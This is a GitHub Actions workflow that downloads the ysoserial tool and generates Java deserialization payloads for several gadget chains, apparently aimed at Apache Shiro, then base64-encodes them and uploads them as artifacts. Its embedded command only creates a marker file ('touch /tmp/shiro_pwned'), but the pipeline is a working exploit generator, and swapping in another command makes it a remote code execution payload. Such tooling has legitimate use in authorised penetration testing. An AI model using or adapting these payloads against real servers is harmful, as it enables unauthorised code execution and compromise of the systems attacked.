name: Generate Shiro Payloads (Multiple Gadgets)

on:
  workflow_dispatch:

jobs:
  generate:
    runs-on: ubuntu-latest
    steps:
      - name: Download ysoserial
        run: |
          curl -L -o ysoserial-all.jar https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar
          ls -lh ysoserial-all.jar

      - name: Generate payloads
        run: |
          JAVA_OPTS="--add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED"
          JAVA_OPTS="$JAVA_OPTS --add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED"
          JAVA_OPTS="$JAVA_OPTS --add-opens java.base/java.lang=ALL-UNNAMED"
          JAVA_OPTS="$JAVA_OPTS --add-opens java.base/java.util=ALL-UNNAMED"
          JAVA_OPTS="$JAVA_OPTS --add-opens java.base/sun.reflect.annotation=ALL-UNNAMED"
          JAVA_OPTS="$JAVA_OPTS --add-opens java.base/java.io=ALL-UNNAMED"
          JAVA_OPTS="$JAVA_OPTS --add-opens java.desktop/com.sun.beans=ALL-UNNAMED"
          JAVA_OPTS="$JAVA_OPTS --add-opens java.base/java.lang.reflect=ALL-UNNAMED"
          JAVA_OPTS="$JAVA_OPTS --add-opens java.base/sun.reflect.misc=ALL-UNNAMED"
          
          mkdir payloads
          CMD="touch /tmp/shiro_pwned"
          
          # Java 7 compatible gadgets
          for gadget in CommonsCollections5 CommonsCollections6 CommonsBeanutils1 CommonsCollections1 Jdk7u21; do
            echo "=== $gadget ==="
            if java $JAVA_OPTS -jar ysoserial-all.jar $gadget "$CMD" > payloads/$gadget.bin 2>/dev/null; then
              size=$(wc -c < payloads/$gadget.bin)
              base64 -w0 payloads/$gadget.bin > payloads/$gadget.b64
              echo "  OK: ${size} bytes"
            else
              echo "  FAILED"
            fi
          done
          
          echo "=== Summary ==="
          ls -la payloads/

      - name: Upload payloads
        uses: actions/upload-artifact@v4
        with:
          name: shiro-payloads
          path: payloads/
          retention-days: 1
